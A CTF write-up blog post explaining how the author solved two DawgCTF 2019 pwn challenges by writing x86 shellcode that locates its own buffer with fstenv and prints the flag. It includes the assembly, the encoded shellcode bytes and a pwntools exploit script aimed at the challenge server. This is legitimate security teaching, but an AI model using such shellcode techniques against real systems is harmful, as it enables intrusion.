---
layout: post
title: "DawgCTF 2019 - Where Am I?"
description: "Writeup for the Where am I? and Where the hell am I? challenges at DawgCTF 2019"
date: 2019-03-27
tags: [ctf, writeup, DawgCTF2019, pwn, shellcode]
comments: true
share: true
---

This writeup is actually intended for two different challenges. As happens pretty frequently at CTFs, "Where am I?" was a challenge designed to introduce people to the problem, and "Where the hell am I?" was a higher-level, more complex version of the challenge.

In these challenges, you're handed free shellcode execution and have to figure out where in memory the shellcode is running, so that they can print the flag from a variable near the shellcode's buffer in-memory.

### Challenge Description

![](/assets/images/whereami.jpeg) |  ![](/assets/images/wherethehell.jpeg)

We know a few things about the challenge just from its description. It's a pwn challenge, so presumably we just have to pass some carefully crafted something-or-other to the production version to break it. We can also see from the hints given by the title and description that we're going to have to find something, presumably the flag's address. Finally, both challenges were nice enough to provide a binary, named `chall1` and `chall2`, respectively.

### Starting, somewhere.

Let's try running the first binary.

```console
[garnt@inari whereami]$ ./chall1 
can't find flag
[garnt@inari whereami]$
```

Fuck.

I wonder why it does that?

![](/assets/images/flagopen.jpeg)

The first thing that the binary does, dead at the start of main, is try to open the file "file.txt". If it doesn't find it, it spits out that string we encountered earlier and exits. It doesn't seem to care about the contents, though.

Let's try touching that file.

```console
[garnt@inari whereami]$ touch flag.txt
[garnt@inari whereami]$ ./chall1 

Segmentation fault (core dumped)
[garnt@inari whereami]$ 
```

Well, we tried to just pass it nothing for input and it segfaulted on us. But this time it didn't complain about flag.txt not existing, so that's a good sign.

Let's try and figure out what happens to that input.

![](/assets/images/stdin-read.png)

If we look at address `0x080486d1`, we'll see a call to read. If we look at everything that's been pushed to stack, we learn that this is the call that reads from stdin, as stdin's file descriptor is `0x0`.

```c
// some variables
void *buf;
FILE *file;
size_t mmap_len;

// mmap to make a buffer, then read flag.txt into it
file = open("flag.txt", O_RDONLY);
mmap(buf, 0x1000, MAP_ANON, -1);
read(file, buf, 0x32);

// read from stdin into the buffer
read(STDIN, buf+0x32, 0x64);

// prevent syscalls so that you don't just cheat the intended solution
install_syscall_filter(...);

// start executing at the user's buffer
// NOTE: this line of code is both a) correct and b) awful
((void (*)(void)) (buf+0x32))();
```

1. `open` a file descriptor to flag.txt
2. `mmap` itself a buffer of size `0x1000`
3. `read` `0x32`'s-worth of flag.txt into the beginning of the buffer
4. `read` `0x64`'s-worth of shellcode into `buf+0x32`
5. execute the user's shellcode

### We Sells C-Shell(code.)

So, all we need to do is, `printf("%s", buf)`. But, bringing back around the name of the challenge in a glorious blaze of segue, I don't know were the hell I am. Fortunately, there's a trick for this: the `fstenv` instruction.

![](/assets/images/fstenv-book.png)

I'm sorry, does that say *"instruction pointer"*?

```asm
fldz
fstenv [esp-0xc]
pop ecx
sub ecx, 0x32
```

Yep, the above 4 lines of assembly puts the address of the flag into `ecx`. Now all we have to do is syscall `write`.

```asm
mov edx, 0x64
mov ecx, <addr>
mov ebx, 0x01
mov eax, 0x04
int 0x80
```

Put it all together, and what do you got?

```asm
fldz
fstenv [esp-0xc]
pop ecx
sub ecx, 0x32
mov edx, 0x64
mov ebx, 0x01
mov eax, 0x04
int 0x80
```

Now that we have our shellcode written as assembly, we just need some way to send it to the ctf server. I like [pwntools](https://github.com/Gallopsled/pwntools), so that's what I'm using for this.

First, use binja to assemble it and encode it as ascii escape codes:

![](/assets/images/binja-assemble.png)

And, after copying it:

`\xd9\xee\x9b\xd9t$\xf4Y\x83\xe92\xbad\x00\x00\x001\xdbC\xb8\x04\x00\x00\x00\xcd\x80`

Throw it into our pwntools script:

```python
#!/usr/bin/env /bin/python2
from pwn import *

payload = "\xd9\xee\x9b\xd9t$\xf4Y\x83\xe92\xbad\x00\x00\x00\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"

r = remote('challenges.notanexploit.club', 3650)
r.sendline(payload)
r.interactive()
```

*(The servers are down now, so I can't submit it to them, but)*

```console
[garnt@inari whereami]$ echo -e "\xd9\xee\x9b\xd9t$\xf4Y\x83\xe92\xbad\x00\x00\x001\xdbC\xb8\x04\x00\x00\x00\xcd\x80" | ./chall1 
DawgCTF{Th15_15_tH3_fL4g}
���t$�Y��2�d1�C�̀
Segmentation fault (core dumped)
[garnt@inari whereami]$
```

Ladies and gentlemen, we got 'em.

### Write Once, Run Anywhere

Just glancing over the disassembly graph, `wherethehellami` seems pretty similar to `whereami`.

![](/assets/images/chall2-graph.png)

Or, in pseudocode:

```c
// some variables
void *buf;
FILE *file;
size_t mmap_len;

// mmap to make a buffer, then read flag.txt into it
file = open("flag.txt", O_RDONLY);
mmap(buf, 0x1000, MAP_ANON, -1);
read(file, buf, 0x32);

// read from stdin into the buffer
read(STDIN, buf+0x32, 0x32);

// prevent syscalls so that you don't just cheat the intended solution
install_syscall_filter(...);

// start executing at the user's buffer
// NOTE: this line of code is both a) correct and b) awful
((void (*)(void)) (buf+0x32))();
```

Upon further inspection, this looks **extremely** similar. In fact, the only obvious difference I can find is that you only get `0x32` bytes for shellcode instead of `0x64` like you did last time. Fortunately, our shellcode is way shorter than that, so let's just try running it back:

```console
[garnt@inari wherethehellami]$ echo -e "\xd9\xee\x9b\xd9t$\xf4Y\x83\xe92\xbad\x00\x00\x001\xdbC\xb8\x04\x00\x00\x00\xcd\x80" | ./chall2
DawgCTF{Th15_15_4n0Th3R_fL4g}
���t$�Y��2�d1�C�̀
Segmentation fault (core dumped)
[garnt@inari wherethehellami]$ 
```

![](https://i.giphy.com/media/NvgkEvycaWhPi/giphy.webp)

Well, you saw it here first, folks: "Write Once, Run Anywhere" is x86 assembly now, not Java.

### Epilogue

Thanks for sticking around until the end. The source for the solve scripts as well as the binaries themselves can be found in these GitHub repos:
- [whereami](https://github.com/GarntS/whereami)
- [wherethehellami](https://github.com/GarntS/wherethehellami)
